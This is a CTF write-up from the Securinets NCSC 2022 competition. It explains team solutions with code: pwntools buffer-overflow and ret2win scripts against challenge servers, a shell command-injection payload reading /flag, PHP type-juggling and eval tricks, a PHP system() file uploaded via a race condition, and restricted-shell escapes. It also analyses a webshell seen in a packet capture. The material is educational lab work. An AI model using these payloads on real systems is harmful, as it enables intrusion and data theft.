# National Cyber Security Congress

[NCSC](https://www.facebook.com/NationalCSC), organized by Securinets, hosted an 8 hours CTF, started the 29th of January at 23:00 (GMT +1). <br/>
I've participated in the CTF with [Aziz Zribi](https://www.facebook.com/Aziz.Zribi.Z), [Zakaria Soussi](https://www.facebook.com/zakaria.soussi.12) & [Anas Chaibi](https://www.facebook.com/chanas07) as a team. We ranked the 7th out of 52 teams.

<br/>
<hr>

* ### Binary exploitation

  #### 1. Babypwn
    That's a pretty basic challenge, here is the source code:
    <details>
    <summary>Show</summary>

    ```C
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    void init_buffering() {
      setvbuf(stdout, NULL, _IONBF, 0);
      setvbuf(stdin, NULL, _IONBF, 0);
      setvbuf(stderr, NULL, _IONBF, 0);
    }
    int main(){
      int x = 0x41414141;
      char name[20];
      init_buffering(); // ignore this line
      puts("what's your name ?");
      gets(name);
      if(x != 0x41414141) {
        execve("/bin/sh", 0, 0);
      }
      return 0;
    }
    ```
    </details>

    We only need to overwrite `x` value in memory so we can just send a payload long enough to overwrite it. Here is a script for this challenge:

    <details>
    <summary>Show</summary>

    ```python
    from pwn import *

    # nc 52.188.108.186 1239
    conn = remote('52.188.108.186',1239)

    conn.send(b'azertyuiopqsdfghjklmwxcvbnaazzeerrttyyuuiiooppmmllkkjjhhggffddsqqwwxxccv' )

    conn.interactive()
    ```
    </details>

    And we get our shell & flag.

    <p align="center">
    <img src="/2022/NCSC/img/babyflag.png"><br/>
    </p>

  #### 2. Babypwn
    For this challenge, we get our source code:
    <details>
    <summary>Show</summary>

    ```C
    #include<stdio.h>
    #include<stdlib.h>
    #include<string.h>
    void win(){
      execve("/bin/sh", 0, 0);
    }
    void strip(char *format) {
      format[strcspn(format, "\n")] = 0;
    }
    void init_buffering() {
      setvbuf(stdout, NULL, _IONBF, 0);
      setvbuf(stdin, NULL, _IONBF, 0);
      setvbuf(stderr, NULL, _IONBF, 0);
    }
    int main(){
      init_buffering();
      puts("Freedom is all I want! you are free to choose your format specifier !");
      char buffer[60];
      char format[20];
      printf("> ");
      read(0, format, 20);
      strip(format);
      puts("Now, do what you want!");
      scanf(format,buffer);
      puts("good bye !");
      return 0;
    }
    ```
    </details>
    That's a ret2win, we have control on the `scanf`'s format & we'll be writing into `buffer`. We start gdb to do some tests, you can find the binary [here](https://github.com/M0ngi/CTF-Writeups/blob/main/2022/NCSC/pwn/freedom). We need to get our win address.

    <p align="center">
      <img src="/2022/NCSC/img/freedomgdb.png"><br/>
    </p>

    Now, we need to get the length of our payload. Since we have control over the format, we'll be reading a string using `%s` & we'll use this pattern: `azertyuiopqsdfghjklmwxcvbnaazzeerrttyyuuiiooppmmllkkjjhhggffddsqqwwxxccvvbbnn`.

    <p align="center">
      <img src="/2022/NCSC/img/freedomgdb2.png"><br/>
    </p>

    And we get a segmentation fault:

    <p align="center">
      <img src="/2022/NCSC/img/freedomgdb3.png"><br/>
    </p>

    Our RIP: `0x6e6e626276 ('vbbnn')`, we now know the proper payload to change the RIP: `azertyuiopqsdfghjklmwxcvbnaazzeerrttyyuuiiooppmmllkkjjhhggffddsqqwwxxccv`

    Now we got everything we need for the exploit, here is our script:

    <details>
    <summary>Show</summary>

    ```python
    from pwn import *

    # nc 52.188.108.186 1237
    conn = remote('52.188.108.186',1237)

    conn.send('%s')
    conn.send(b'azertyuiopqsdfghjklmwxcvbnaazzeerrttyyuuiiooppmmllkkjjhhggffddsqqwwxxccv' + p64(0x00000000004011f6))

    conn.interactive()
    ```
    </details>

    And our flag is `Securinets{d4ce75b4a536228bfc8371bfba2fdd45}`

* ### Web
  #### 1.  Broken Pingyy 
    For this challenge, we get the source code:
    <details>
    <summary>Show</summary>

    ```php
    <?php
    if(isset($_POST['ip'])){
      $cmd=$_POST['ip'];
      $clean=escapeshellarg($cmd);
      if($output = shell_exec("bash -c 'ping -c1 -w3 $clean" ))
        echo "<pre>$output</pre>";
      else
        echo "an error has occurred !";
    }
    ?>
    ```
    </details>

    And a link to this page:

    <p align="center">
      <img src="/2022/NCSC/img/webpingy.png"><br/>
    </p>

    If we use `www.google.com` as an input, we'll get ` an error has occurred ! `, Let's have a look at the code.

    As a start, we notice that we have a missing `'` at the end of `shell_exec("bash -c 'ping -c1 -w3 $clean" )` which caused our error. Also we are using `escapeshellarg`, a quick lookup in php documentation gives the following: (Ref)[https://www.php.net/manual/en/function.escapeshellarg.php]

    ```
    escapeshellarg() adds single quotes around a string and quotes/escapes any existing single quotes
    ```
    which means that our `$clean` variable should have a closing quote! Let's visualize this with an example, if we use `payload` as an input, saved in `$cmd`, after `escapeshellarg` we should have `$clean` equal to `'payload'` which means, `shell_exec` will be executed with `bash -c 'ping -c1 -w3 'payload'`. Therefor, if we escape the last quote & start our payload with a `;`, we should have `bash -c 'ping -c1 -w3 ';payload\'`. We'll be able to inject shell commands in our payload but we'll have to make use of the last quote to avoid getting an error, we can include an `;echo ` at the end of our payload to simply show that quote & avoid any errors. 
      
    Our final payload should look like this: `;cmd;echo \` which will result in executing `cmd` & that's our shell! Now we can try to get the content of `/flag` using `;cat /flag;echo \` as a payload & we get our flag!

    <p align="center">
      <img src="/2022/NCSC/img/webpingyflag.png"><br/>
    </p>
      
  #### 2.  Welcome To Web Universe
    
    For this challenge, we get a zip with the source code [Link](/2022/NCSC/Welcome%20To%20Web%20Universe)

    And a link to an empty page that contains `Everything is good afaik`.
      
    Looking at the source code, we know that we have a flask web server, if we examine the [main.py](/2022/NCSC/Welcome%20To%20Web%20Universe/src/main.py) we see that we have 2 routes, `/v1/status` & `/flag`, we'll be aiming for the flag route. If we check the link we got, we can see that we are in `/leetstatus`, this looks weird.
      
    Digging more into the files given, if we check the configuration file located in [nginx](/2022/NCSC/Welcome%20To%20Web%20Universe/nginx), we find this configuration
    
    ```config
    server {
      listen 80;
      server_name welcome.task;

      location /leet {
        proxy_pass http://api:5000/v1/;
      }

      access_log off;
      error_log /var/log/nginx/error.log error;
    }
    ```
      
    I don't have any knowledge about this kind of servers but looking at the `location` section, we can be redirecting `/leet` to our api's route `/v1/`. As if we are saying that `/leet` is replaced by `/v1/`, which makes sense because our current route `/leetstatus` will become `/v1/status` ! Now we want to navigate to our `/flag` route, we can use `/leet../flag` which will be transformed into `/flag` & we get our flag: 
      
    `Securinets{Nginx_Is_NoT_ThaT_GooD_AftER_All}`

  #### 3. Peehpee
    
    For this challenge, we get our source code:
    <details>
    <summary>Show</summary>

    ```php
    <?php
      //Show Page code source
      highlight_file(__FILE__);
      require "secret.php";
      if(isset($_GET["__"])&&isset($_GET["_"])){
        $x=$_GET["__"];
        $inp=preg_replace("/[^A-Za-z0-9$]/","",$_GET["_"]);
        if($inp==="Kahla"){
          die("Hacking Attempt detected");
        }
        else{
          if(eval("return $inp=".$inp.";")==="Kahla"){
              echo $flag;
          }
          else{
              die("Pretty Close maybe ?");
          }
        }
      }
    ?>
    ```
    </details>
    
    We have 2 parameters, `_` & `__`, passed via GET request. We are saving `__` into `$x` & then we see somekind of a filter applied on `_`, allowing only alphabet characters, digits & the dollar sign `$`. After replacing unauthorized characters, we store that in `$inp`.
      
    Then we check `$inp` value, if equal to "Kahla" then we fail, else we have an `eval` which will change `$inp` value to whatever `$inp` contains, concatenated as a string. If the value of `$inp` is "Kahla" after executing `eval`, we'll get our flag.
      
    Since no check on `__` is done, we can pass `Kahla` in it & it'll be saved in `$x` & since we'll be setting `$inp` to whatever value it contains, we can pass `$x` (The $ is authorized) & it'll evaluate as `$inp = $x`. 
      
    As simple as that, we get our flag: `Securinets{PeehPee_1s_AlWAYs_H3r3}`

  #### 4. weird php
    For this challenge, we get our source code:
    <details>
    <summary>Show</summary>

    ```php
    <?php
      highlight_file(__FILE__);
      include ("secret.php");

      if (isset($_GET['a'])&&isset($_GET['b'])&&isset($_GET['c'])) {
          $array = json_decode($_GET['a']);
          if ($array->key == SECRET) {
              if ( ($_GET['b'] !== $_GET['c']) && (md5($_GET['b']) === md5($_GET['c']) ) ) {
                  echo FLAG;
              }else {
                  echo "👍👍👍👍👍👍👍👍👍";
              }
          } else {
              echo "Try harder bb :)";
          }
      }
      ?> 
    ```
    </details>
      
    We have 3 parameters, `a`, `b` & `c`. We can see that `a` is a JSON that gets parsed by `json_decode`. Also, we have a loose comparison on the `key` value in `a` with `SECRET`, then we get a check on `b` & `c`. 
      
    Starting with the first check, we can use `0` for the `key` value & PHP will evaluate that as true [Ref to Type Juggling](https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf), If we try `a={"key":0}&b=&c=` we'll pass the first check.
      
    Second, we compare `b` & `c` (strict comparison) therefor, both of their types must match. Also, their MD5 hash must be equal. We can abuse the `md5` function by sending `b` & `c` as an array, which will return null for both & throw a warning.
      
    Finally, we can use the following parameters `a={"key":0}&b[]=a&c[]=b` & get our flag: ` Securinets{Th1S_1s_t00_w3iRd!!!}`
      
  #### 5. Race Uploader
      
    For this one, we get this page

    <p align="center">
      <img src="/2022/NCSC/img/race.png"><br/>
    </p>
      
    And we get the source code

    <details>
    <summary>Show</summary>

    ```php
    <?php
    $is_upload = false;
    $msg = null;
    define("UPLOAD_PATH","/var/www/html/uploads");
    if(isset($_POST['submit'])){
      if ($_FILES['image']["size"] > 500000){
          die("Tooo large");
      }
      $ext_arr = array('jpg','png','gif');
      $file_name = $_FILES['image']['name'];
      $temp_file = $_FILES['image']['tmp_name'];
      $file_ext = substr($file_name,-3);
      $upload_file = UPLOAD_PATH . '/' . $file_name;

      if(move_uploaded_file($temp_file, $upload_file)){

          if(in_array($file_ext,$ext_arr)){
               $img_path = UPLOAD_PATH . '/'. md5(rand(1, 1000)).".".$file_ext;
               rename($upload_file, $img_path);
               echo "file was uploaded successfully";
               die();
          }else{   
              unlink($upload_file);
              echo "Your file was deleted !"."<br>";
              die("Only jpg,png and gif files are allowed");
          }
      }else{
          die('an Error has occured !!');
      }
    }
    ?>
    ```
    </details>
      
    So what are we doing here? We upload a file, the file is moved to `/uploads`, we check the file extension, if it's an image we rename the file with a random name (`md5(rand(1,1000))`) else we'll be deleting the file. What's the problem here? The file is moved to an accessible location before verifying whether it'll be authorized or no & that'll be our attack vector. Code gets executed instruction after an other so if we are fast enough (& lucky enough), we can access the uploaded file before it's deleted, no matter what type it's! We were told that the flag is in `/flag` so we can make a php file with the following
      
    ```php
    <?php
      echo system('cat /ls');
    ?>
    ```
      
    We'll name that `payload.php`. We'll be using a python script for this time race which is the following
    
    ```python
    import requests
      
    while True:
      r = requests.get('http://20.119.58.135:567/uploads/payload.php')
      if r.status_code == 200:
        print(r.content)
        break
    ```
      
    And we run that & upload our `payload.php` to get our flag:
      
    <p align="center">
      <img src="/2022/NCSC/img/raceflag.png"><br/>
    </p>
      
* ### Forensics
  #### 1.  Attack01
    
    We didn't solve this challenge because we had the last part of the flag missing but it's worth to mention this one. We get a .pcap file & we were told that we need to track an attacker. The flag contained 3 parts:
    
    ```
    1- Country and vpn company used?  country:vpncompany:ipaddress

    2- Name of the executable that was uploaded onto the server? 

    3- What was the message that the hacker left on the server and file that they saved that message to? message:file
    ```
      
    Opening the capture file using wireshark & going throught the requests, we can notice the following:
      
    <p align="center">
      <img src="/2022/NCSC/img/attack01_1.png"><br/>
    </p>
      
    We can see in the picture above that IP `5.8.16.237` is using somekind of a dict attack to find files in the server. If we dig more, we'll find this:
    
    <p align="center">
      <img src="/2022/NCSC/img/attack01_2.png"><br/>
    </p>
      
    That's a webshell, this is definitely our attacker! We got the IP `5.8.16.237` & a quick IP lookup gives us the following
      
    ```
    IP: 5.8.16.237
    Organization: EstNOC
    Country: Russia
    ```
    If we dig more into this, we'll find a POST request to the webshell that contains a binary file:
      
    <p align="center">
      <img src="/2022/NCSC/img/attack01_3.png"><br/>
    </p>
    
    We get the binary name! `hickityhackityOWO.exe`
      
    And that was all, we couldn't find the last detail.
    
* ### Misc
  #### 1. Jail
    In this challenge, we were given an ssh command to connect to a server, we were given a limited shell, we only had these characters authorized: `atlfsc$IFS?`
      
    If you try any other character, you'll be disconnected from the server.
      
    If we try `ls`, we get `flag.txt` but how can we get the content of it using only the whitelisted set of keys? Digging into this in google helped in knowing that space character can be replaced with `$IFS`, we have our `cat` command authorized & we have the one-character wildcard `?`. As a start I went for `cat$IFSfla??t?t` but for some reason, this didn't work. All I had to do was replace the whole `flag.txt` with `?`.
      
    Final command: `cat$IFS????????`<br/>
    Flag: `Securinets{94fd7d4d85b75d948eadca7414826e2a}`
      
  #### 2. Prison Break
    Similar to Jail but more limited in characters, we only have `()<?$` now. So when I was trying some random commands in my terminal, I landed on this: `<filename`, if you try that on a file, you'll get the following:

    <p align="center">
      <img src="/2022/NCSC/img/prison1.png"><br/>
    </p>

    This can be of use, but if we try that in our shell we don't get anything, we are one step closer. Now, how can we get the content to be printed in our screen? In shell, we can use `$(cmd)` in order to execute a command, so what if we pass the content of our file as a command? 

    <p align="center">
      <img src="/2022/NCSC/img/prison2.png"><br/>
    </p>
    
    We get our flag!

<br/>
<hr/>

## Conclusion

Despite being tired, I was too excited to keep going & I was able to play till the end of the CTF considering this as my first time to attend this congress. A special thanks to Securinets for hosting such an event, to the organization staff & a more special one to the technical team for making such great challenges & being there to provide support. Finally, I would like to thank my team for doing their best & for enjoying our stay during the event.

I'll be looking forward for [NCSC](https://www.facebook.com/NationalCSC) 4.0!
      
